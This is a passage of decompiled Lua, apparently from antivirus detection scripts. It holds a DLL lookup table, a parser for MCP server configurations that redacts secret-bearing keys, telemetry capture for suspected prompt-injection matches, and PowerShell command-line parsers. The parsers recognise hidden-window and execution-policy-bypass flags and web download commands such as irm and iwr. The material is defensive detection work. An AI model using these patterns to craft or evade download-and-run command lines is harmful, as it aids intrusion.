  L2_2 = "dhcpcsvc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "embeddedmodesvcapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "scecli.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "spfileq.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "spinf.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "winnsi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dhcpcsvc6.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "w32topl.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "windows.storage.onecore.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "appxapplicabilityengine.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "staterepository.core.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "deviceaccess.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "deviceassociation.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ippcommon.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "prntvpt.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mscms.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mprext.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "netplwiz.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "rasdlg.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mprapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "sstpcfg.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "normaliz.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "microsoft.internal.warppal.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wuceffects.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "clbcatq.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dbgcore.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "werui.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "psmserviceexthost.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "resourcepolicyserver.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "srumapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wcmapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "msxml6.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "aadwamextension.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "taskschd.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ddccomimplementationsdesktop.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wlidprov.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "windows.security.authentication.web.core.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "idstore.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wmitomi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "win32_deviceguard.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wmiutils.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ncobjapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "hspapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "windows.web.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mdmcommon.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "devicedirectoryclient.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "qmgrprxy.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "es.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "vsstrace.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "vssapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "execmodelproxy.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "onecorecommonproxystub.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "execmodelclient.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "pcwum.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wsmsvc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "miutils.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wsmanautomation.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ssdpapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "upnp.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "bitsigd.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "flightsettings.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "bitsperf.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "qmgr.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "fcon.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "offreg.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "shellcommoncommonproxystub.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "securityhealthproxystub.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "securityhealthudk.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "securityhealthagent.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "psapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "npfproxy.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "netprofm.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wscproxystub.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "onecoreuapcommonproxystub.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wscapi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ncryptsslp.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mswsock.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ondemandconnroutehelper.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "perfos.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "perfproc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "pdh.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "securitycenterbrokerps.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "fastprox.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wbemsvc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wbemcomn.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wbemprox.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "rsaenh.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "securitycenterbroker.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wscsvc.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wscnotify.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "rasadhlp.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "diasymreader.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wpnapps.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "sc.exe"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "system.transactions.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "clrjit.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "pwrshsip.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "system.data.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "windows.staterepositoryps.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "dtrace.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "appxsip.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "system.numerics.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "wshext.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "msisip.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "esdsip.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "amsi.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "ucrtbase_clr0400.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "vcruntime140_1_clr0400.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "vcruntime140_clr0400.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "clr.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mscoreei.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "mscoree.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = "atl.dll"
  L3_2 = true
  L1_2[L2_2] = L3_2
  L2_2 = L1_2[A0_2]
  return L2_2
end

isMDEBlockingPolicy = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2, L25_2, L26_2, L27_2, L28_2
  if A0_2 ~= nil then
    L1_2 = type
    L2_2 = A0_2
    L1_2 = L1_2(L2_2)
    if L1_2 == "table" then
      goto lbl_10
    end
  end
  L1_2 = nil
  do return L1_2 end
  ::lbl_10::
  
  function L1_2(A0_3, A1_3)
    local L2_3, L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3, L12_3, L13_3, L14_3, L15_3, L16_3, L17_3
    if A0_3 ~= nil then
      L2_3 = type
      L3_3 = A0_3
      L2_3 = L2_3(L3_3)
      if L2_3 == "table" then
        goto lbl_12
      end
    end
    L2_3 = false
    L3_3 = "Raw table not provided"
    do return L2_3, L3_3 end
    goto lbl_18
    ::lbl_12::
    L2_3 = #A0_3
    if 128 < L2_3 then
      L2_3 = false
      L3_3 = "Too many kvs in raw table"
      return L2_3, L3_3
    end
    ::lbl_18::
    if A1_3 == nil then
      L2_3 = false
      L3_3 = "Patterns not provided"
      return L2_3, L3_3
    else
      L2_3 = type
      L3_3 = A1_3
      L2_3 = L2_3(L3_3)
      if L2_3 ~= "table" then
        L2_3 = false
        L3_3 = "Invalid patterns table"
        return L2_3, L3_3
      else
        L2_3 = #A1_3
        if 128 < L2_3 then
          L2_3 = false
          L3_3 = "Too many patterns"
          return L2_3, L3_3
        else
          L2_3 = ipairs
          L3_3 = A1_3
          L2_3, L3_3, L4_3 = L2_3(L3_3)
          for L5_3, L6_3 in L2_3, L3_3, L4_3 do
            L7_3 = type
            L8_3 = L6_3
            L7_3 = L7_3(L8_3)
            if L7_3 ~= "string" then
              L7_3 = false
              L8_3 = string
              L8_3 = L8_3.format
              L9_3 = "Patterns table contains non-string at index %s"
              L10_3 = L5_3
              L8_3, L9_3, L10_3, L11_3, L12_3, L13_3, L14_3, L15_3, L16_3, L17_3 = L8_3(L9_3, L10_3)
              return L7_3, L8_3, L9_3, L10_3, L11_3, L12_3, L13_3, L14_3, L15_3, L16_3, L17_3
            end
          end
        end
      end
    end
    L2_3 = {}
    L3_3 = pairs
    L4_3 = A0_3
    L3_3, L4_3, L5_3 = L3_3(L4_3)
    for L6_3, L7_3 in L3_3, L4_3, L5_3 do
      L8_3 = false
      L9_3 = type
      L10_3 = L6_3
      L9_3 = L9_3(L10_3)
      if L9_3 == "string" then
        L9_3 = string
        L9_3 = L9_3.lower
        L10_3 = L6_3
        L9_3 = L9_3(L10_3)
        L10_3 = ipairs
        L11_3 = A1_3
        L10_3, L11_3, L12_3 = L10_3(L11_3)
        for L13_3, L14_3 in L10_3, L11_3, L12_3 do
          L15_3 = string
          L15_3 = L15_3.find
          L16_3 = L9_3
          L17_3 = L14_3
          L15_3 = L15_3(L16_3, L17_3)
          if L15_3 then
            L8_3 = true
            break
          end
        end
      end
      if not L8_3 then
        L2_3[L6_3] = L7_3
      end
    end
    L3_3 = true
    L4_3 = L2_3
    return L3_3, L4_3
  end
  
  function L2_2(A0_3)
    local L1_3, L2_3, L3_3, L4_3, L5_3, L6_3, L7_3
    L1_3 = type
    L2_3 = A0_3
    L1_3 = L1_3(L2_3)
    if L1_3 ~= "string" then
      L1_3 = nil
      return L1_3
    end
    L1_3 = string
    L1_3 = L1_3.find
    L2_3 = A0_3
    L3_3 = "?"
    L4_3 = 1
    L5_3 = true
    L1_3 = L1_3(L2_3, L3_3, L4_3, L5_3)
    L2_3 = string
    L2_3 = L2_3.find
    L3_3 = A0_3
    L4_3 = "#"
    L5_3 = 1
    L6_3 = true
    L2_3 = L2_3(L3_3, L4_3, L5_3, L6_3)
    L3_3 = nil
    if L1_3 and L2_3 then
      L4_3 = math_min
      L5_3 = L1_3
      L6_3 = L2_3
      L4_3 = L4_3(L5_3, L6_3)
      L3_3 = L4_3
    else
      L3_3 = L1_3 or L3_3
      if not L1_3 then
        L3_3 = L2_3
      end
    end
    if L3_3 then
      L4_3 = string
      L4_3 = L4_3.sub
      L5_3 = A0_3
      L6_3 = 1
      L7_3 = L3_3 - 1
      return L4_3(L5_3, L6_3, L7_3)
    end
    return A0_3
  end
  
  L3_2 = {}
  L4_2 = "^cookie$"
  L5_2 = "authorization"
  L6_2 = "token"
  L7_2 = "secret"
  L8_2 = "api[-_]key"
  L9_2 = "[-_]pat$"
  L3_2[1] = L4_2
  L3_2[2] = L5_2
  L3_2[3] = L6_2
  L3_2[4] = L7_2
  L3_2[5] = L8_2
  L3_2[6] = L9_2
  L4_2 = {}
  L5_2 = "token"
  L6_2 = "secret"
  L7_2 = "api[-_]key"
  L8_2 = "[-_]pat$"
  L4_2[1] = L5_2
  L4_2[2] = L6_2
  L4_2[3] = L7_2
  L4_2[4] = L8_2
  L5_2 = {}
  L6_2 = pairs
  L7_2 = A0_2
  L6_2, L7_2, L8_2 = L6_2(L7_2)
  for L9_2, L10_2 in L6_2, L7_2, L8_2 do
    L11_2 = nil
    L12_2 = nil
    L13_2 = nil
    L14_2 = nil
    L15_2 = nil
    L16_2 = nil
    L17_2 = nil
    L18_2 = nil
    L19_2 = nil
    L20_2 = L10_2.command
    if not L20_2 then
      L20_2 = L10_2.cmd
    end
    L21_2 = L10_2.arguments
    if not L21_2 then
      L21_2 = L10_2.args
    end
    L22_2 = type
    L23_2 = L20_2
    L22_2 = L22_2(L23_2)
    if L22_2 == "table" and L21_2 == nil then
      L22_2 = #L20_2
      if 1 <= L22_2 then
        L22_2 = table
        L22_2 = L22_2.remove
        L23_2 = L20_2
        L24_2 = 1
        L22_2 = L22_2(L23_2, L24_2)
        L14_2 = L22_2
        L15_2 = L20_2
    end
    else
      L14_2 = L20_2
      L15_2 = L21_2
    end
    L22_2 = L2_2
    L23_2 = L10_2.httpUrl
    if not L23_2 then
      L23_2 = L10_2.url
    end
    L22_2 = L22_2(L23_2)
    L17_2 = L22_2
    L22_2 = L10_2.transportType
    if not L22_2 then
      L22_2 = L10_2.transport
      if not L22_2 then
        L22_2 = L10_2.type
        if not L22_2 then
          L22_2 = ""
        end
      end
    end
    L23_2 = type
    L24_2 = L22_2
    L23_2 = L23_2(L24_2)
    if L23_2 ~= "string" then
      L22_2 = ""
    end
    L23_2 = string
    L23_2 = L23_2.lower
    L24_2 = L22_2
    L23_2 = L23_2(L24_2)
    L22_2 = L23_2
    if L22_2 ~= "http" and L22_2 ~= "sse" and L22_2 ~= "stdio" then
      if L22_2 == "streamablehttp" or L17_2 ~= nil and L17_2 ~= "" then
        L16_2 = "http"
      elseif L22_2 ~= "local" then
        L23_2 = L10_2.command
        if L23_2 ~= nil then
          L23_2 = L10_2.command
          if L23_2 ~= "" then
            L16_2 = "stdio"
          end
        end
      end
    else
      L16_2 = L22_2
    end
    if L16_2 ~= "http" and L16_2 ~= "sse" and L16_2 ~= "stdio" then
      L16_2 = nil
    end
    L23_2 = L10_2.environmentVariables
    if not L23_2 then
      L23_2 = L10_2.environment_variables
      if not L23_2 then
        L23_2 = L10_2.environment
        if not L23_2 then
          L23_2 = L10_2.env_vars
          if not L23_2 then
            L23_2 = L10_2.env
          end
        end
      end
    end
    L24_2 = pcall
    L25_2 = L1_2
    L26_2 = L23_2
    L27_2 = L4_2
    L24_2, L25_2, L26_2 = L24_2(L25_2, L26_2, L27_2)
    L13_2 = L26_2
    L12_2 = L25_2
    L11_2 = L24_2
    if L11_2 and L12_2 then
      L18_2 = L13_2
    end
    L24_2 = L10_2.env_http_headers
    if not L24_2 then
      L24_2 = L10_2.httpHeaders
      if not L24_2 then
        L24_2 = L10_2.http_headers
        if not L24_2 then
          L24_2 = L10_2.headers
        end
      end
    end
    L25_2 = pcall
    L26_2 = L1_2
    L27_2 = L24_2
    L28_2 = L3_2
    L25_2, L26_2, L27_2 = L25_2(L26_2, L27_2, L28_2)
    L13_2 = L27_2
    L12_2 = L26_2
    L11_2 = L25_2
    if L11_2 and L12_2 then
      L19_2 = L13_2
    end
    L25_2 = {}
    L25_2.ServerName = L9_2
    L25_2.TransportType = L16_2
    L25_2.Command = L14_2
    L25_2.CommandArgs = L15_2
    L25_2.Environment = L18_2
    L25_2.UrlEndpoint = L17_2
    L25_2.Headers = L19_2
    L26_2 = table
    L26_2 = L26_2.insert
    L27_2 = L5_2
    L28_2 = L25_2
    L26_2(L27_2, L28_2)
  end
  return L5_2
end

McpParseHelper = L23_1

function L23_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if L2_2 ~= "number" or A0_2 < 0 then
    A0_2 = 80
  end
  L2_2 = type
  L3_2 = A1_2
  L2_2 = L2_2(L3_2)
  if L2_2 ~= "number" or A1_2 < 0 then
    A1_2 = 512
  end
  L2_2 = mp
  L2_2 = L2_2.GetBruteMatchData
  L2_2 = L2_2()
  if L2_2 == nil then
    return
  end
  L3_2 = L2_2.match_offset
  if L3_2 == nil then
    return
  end
  if 1048576 < L3_2 then
    return
  end
  L4_2 = L3_2 - A0_2
  if L4_2 < 0 then
    L4_2 = 0
  end
  L5_2 = mp
  L5_2 = L5_2.readprotection
  L6_2 = false
  L5_2(L6_2)
  L5_2 = mp
  L5_2 = L5_2.readfile
  L6_2 = L4_2
  L7_2 = A1_2
  L5_2 = L5_2(L6_2, L7_2)
  L6_2 = mp
  L6_2 = L6_2.readprotection
  L7_2 = true
  L6_2(L7_2)
  if L5_2 == nil then
    return
  end
  L6_2 = MpCommon
  L6_2 = L6_2.Base64Encode
  L7_2 = L5_2
  L6_2 = L6_2(L7_2)
  if L6_2 == nil then
    return
  end
  L7_2 = mp
  L7_2 = L7_2.set_mpattribute
  L8_2 = "MpInternal_researchdata=EncodedBytes="
  L9_2 = L6_2
  L8_2 = L8_2 .. L9_2
  L7_2(L8_2)
end

CollectXpiaEncodingTelemetry = L23_1

function L23_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L3_2 = type
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "number" or A1_2 < 0 then
    A1_2 = 80
  end
  L3_2 = type
  L4_2 = A2_2
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "number" or A2_2 < 0 then
    A2_2 = 512
  end
  L3_2 = 16777216
  L4_2 = mp
  L4_2 = L4_2.BMSearchFile
  L5_2 = 0
  L6_2 = L3_2
  L7_2 = A0_2
  L4_2 = L4_2(L5_2, L6_2, L7_2)
  if L4_2 == nil or L4_2 < 0 then
    return
  end
  if 1048576 < L4_2 then
    return
  end
  L5_2 = L4_2 - A1_2
  if L5_2 < 0 then
    L5_2 = 0
  end
  L6_2 = mp
  L6_2 = L6_2.getfilesize
  L6_2 = L6_2()
  if A2_2 > L6_2 then
    A2_2 = L6_2
  end
  L7_2 = mp
  L7_2 = L7_2.readprotection
  L8_2 = false
  L7_2(L8_2)
  L7_2 = mp
  L7_2 = L7_2.readfile
  L8_2 = L5_2
  L9_2 = A2_2
  L7_2 = L7_2(L8_2, L9_2)
  L8_2 = mp
  L8_2 = L8_2.readprotection
  L9_2 = true
  L8_2(L9_2)
  if L7_2 == nil then
    return
  end
  L8_2 = MpCommon
  L8_2 = L8_2.Base64Encode
  L9_2 = L7_2
  L8_2 = L8_2(L9_2)
  if L8_2 == nil then
    return
  end
  return L8_2
end

CollectXpiaBruteTelemetry = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = string
  L1_2 = L1_2.match
  L2_2 = A0_2
  L3_2 = "^%s*(.-)%s*$"
  return L1_2(L2_2, L3_2)
end

function L24_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2
  L2_2 = string
  L2_2 = L2_2.match
  L3_2 = A0_2
  L4_2 = "^\"([^\"]+)\"%s+(.+)$"
  L2_2, L3_2 = L2_2(L3_2, L4_2)
  if L2_2 == nil then
    L4_2 = string
    L4_2 = L4_2.match
    L5_2 = A0_2
    L6_2 = "^([^%s]+)%s+(.+)$"
    L4_2, L5_2 = L4_2(L5_2, L6_2)
    L3_2 = L5_2
    L2_2 = L4_2
  end
  L4_2 = L2_2 or L4_2
  if L2_2 then
    L4_2 = string
    L4_2 = L4_2.match
    L5_2 = L2_2
    L6_2 = "([^\\]+)$"
    L4_2 = L4_2(L5_2, L6_2)
  end
  if L4_2 ~= "powershell" and L4_2 ~= "powershell.exe" and L4_2 ~= "pwsh" and L4_2 ~= "pwsh.exe" then
    if A1_2 then
      L5_2 = ""
      if L5_2 then
        goto lbl_36
      end
    end
    L5_2 = A0_2
    ::lbl_36::
    return L5_2
  end
  L5_2 = 1
  L6_2 = 16
  L7_2 = 1
  for L8_2 = L5_2, L6_2, L7_2 do
    L9_2 = string
    L9_2 = L9_2.match
    L10_2 = L3_2
    L11_2 = "^(%-[%a]+)%s+(.+)$"
    L9_2, L10_2 = L9_2(L10_2, L11_2)
    if L9_2 == "-c" or L9_2 == "-command" then
      L11_2 = string
      L11_2 = L11_2.sub
      L12_2 = L10_2
      L13_2 = 1
      L14_2 = 1
      L11_2 = L11_2(L12_2, L13_2, L14_2)
      if L11_2 == "\"" then
        L11_2 = string
        L11_2 = L11_2.sub
        L12_2 = L10_2
        L13_2 = -1
        L11_2 = L11_2(L12_2, L13_2)
        if L11_2 ~= "\"" then
          L11_2 = ""
          return L11_2
        end
        L11_2 = string
        L11_2 = L11_2.sub
        L12_2 = L10_2
        L13_2 = 2
        L14_2 = -2
        L11_2 = L11_2(L12_2, L13_2, L14_2)
        L10_2 = L11_2
      end
      L11_2 = L23_1
      L12_2 = L10_2
      return L11_2(L12_2)
    end
    if L9_2 == "-nop" or L9_2 == "-noprofile" or L9_2 == "-noni" or L9_2 == "-noninteractive" or L9_2 == "-nologo" then
      L3_2 = L10_2
    elseif L9_2 == "-w" or L9_2 == "-windowstyle" or L9_2 == "-ep" or L9_2 == "-executionpolicy" then
      L11_2 = string
      L11_2 = L11_2.match
      L12_2 = L10_2
      L13_2 = "^(%w+)%s+(.+)$"
      L11_2, L12_2 = L11_2(L12_2, L13_2)
      if L11_2 == nil then
        L13_2 = ""
        return L13_2
      end
      if L9_2 == "-w" or L9_2 == "-windowstyle" then
        if L11_2 ~= "h" and L11_2 ~= "hidden" and L11_2 ~= "1" and L11_2 ~= "minimized" and L11_2 ~= "normal" then
          L13_2 = ""
          return L13_2
        end
      elseif L11_2 ~= "bypass" and L11_2 ~= "unrestricted" and L11_2 ~= "remotesigned" then
        L13_2 = ""
        return L13_2
      end
      L3_2 = L12_2
    else
      L11_2 = ""
      return L11_2
    end
  end
  L5_2 = ""
  return L5_2
end

function L25_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2
  L1_2 = string
  L1_2 = L1_2.find
  L2_2 = A0_2
  L3_2 = "[`();|{}<>#]"
  L1_2 = L1_2(L2_2, L3_2)
  if L1_2 then
    L1_2 = {}
    return L1_2
  end
  L1_2 = {}
  L2_2 = {}
  L3_2 = ""
  L4_2 = 1
  L5_2 = 1
  L6_2 = 128
  L7_2 = 1
  for L8_2 = L5_2, L6_2, L7_2 do
    L9_2 = #A0_2
    if L4_2 > L9_2 then
      break
    end
    L9_2 = nil
    if L3_2 == "" then
      L10_2 = string
      L10_2 = L10_2.find
      L11_2 = A0_2
      L12_2 = "[%s'\"]"
      L13_2 = L4_2
      L10_2 = L10_2(L11_2, L12_2, L13_2)
      L9_2 = L10_2
    else
      L10_2 = string
      L10_2 = L10_2.find
      L11_2 = A0_2
      L12_2 = "['\"]"
      L13_2 = L4_2
      L10_2 = L10_2(L11_2, L12_2, L13_2)
      L9_2 = L10_2
    end
    if L9_2 then
      L10_2 = L9_2 - 1
      if L10_2 then
        goto lbl_46
      end
    end
    L10_2 = #A0_2
    ::lbl_46::
    if L4_2 <= L10_2 then
      L11_2 = string
      L11_2 = L11_2.sub
      L12_2 = A0_2
      L13_2 = L4_2
      L14_2 = L10_2
      L11_2 = L11_2(L12_2, L13_2, L14_2)
      if L3_2 == "'" then
        L12_2 = string
        L12_2 = L12_2.find
        L13_2 = L11_2
        L14_2 = "$"
        L15_2 = 1
        L16_2 = true
        L12_2 = L12_2(L13_2, L14_2, L15_2, L16_2)
        if L12_2 then
          L12_2 = {}
          return L12_2
        end
      end
      L12_2 = #L2_2
      L12_2 = L12_2 + 1
      L2_2[L12_2] = L11_2
    end
    if L9_2 == nil then
      L11_2 = #A0_2
      L4_2 = L11_2 + 1
      break
    end
    L11_2 = string
    L11_2 = L11_2.sub
    L12_2 = A0_2
    L13_2 = L9_2
    L14_2 = L9_2
    L11_2 = L11_2(L12_2, L13_2, L14_2)
    if L11_2 == "'" or L11_2 == "\"" then
      if L3_2 == "" then
        L3_2 = L11_2
      elseif L3_2 == L11_2 then
        L3_2 = ""
      else
        L12_2 = {}
        return L12_2
      end
      L4_2 = L9_2 + 1
    else
      L12_2 = next
      L13_2 = L2_2
      L12_2 = L12_2(L13_2)
      if L12_2 ~= nil then
        L12_2 = #L1_2
        if 32 <= L12_2 then
          L12_2 = {}
          return L12_2
        end
        L12_2 = #L1_2
        L12_2 = L12_2 + 1
        L13_2 = table
        L13_2 = L13_2.concat
        L14_2 = L2_2
        L13_2 = L13_2(L14_2)
        L1_2[L12_2] = L13_2
        L12_2 = {}
        L2_2 = L12_2
      end
      L12_2 = string
      L12_2 = L12_2.find
      L13_2 = A0_2
      L14_2 = "%s+"
      L15_2 = L9_2
      L12_2, L13_2 = L12_2(L13_2, L14_2, L15_2)
      L4_2 = L13_2 + 1
    end
  end
  L5_2 = #A0_2
  if L4_2 <= L5_2 or L3_2 ~= "" then
    L5_2 = {}
    return L5_2
  end
  L5_2 = next
  L6_2 = L2_2
  L5_2 = L5_2(L6_2)
  if L5_2 ~= nil then
    L5_2 = #L1_2
    if 32 <= L5_2 then
      L5_2 = {}
      return L5_2
    end
    L5_2 = #L1_2
    L5_2 = L5_2 + 1
    L6_2 = table
    L6_2 = L6_2.concat
    L7_2 = L2_2
    L6_2 = L6_2(L7_2)
    L1_2[L5_2] = L6_2
  end
  return L1_2
end

function L26_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = string
  L1_2 = L1_2.match
  L2_2 = A0_2
  L3_2 = "^%s*([%a%-]+)%s+"
  L1_2 = L1_2(L2_2, L3_2)
  if L1_2 ~= "irm" and L1_2 ~= "invoke-restmethod" and L1_2 ~= "iwr" and L1_2 ~= "invoke-webrequest" then
    L2_2 = ""
    L3_2 = ""
    return L2_2, L3_2
  end
  L2_2 = L25_1
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = L2_2[1]
  if L3_2 ~= L1_2 then
    L3_2 = ""
    L4_2 = ""
    return L3_2, L4_2
  end
  L3_2 = ""
  L4_2 = ""
  L5_2 = 2
  while true do
    L6_2 = #L2_2
    if not (L5_2 <= L6_2) then
      break
    end
    L6_2 = L2_2[L5_2]
    if L6_2 == "-uri" or L6_2 == "-u" then
      if L3_2 == "" then
        L7_2 = L5_2 + 1
        L7_2 = L2_2[L7_2]
        if L7_2 ~= nil then
          goto lbl_46
        end
      end
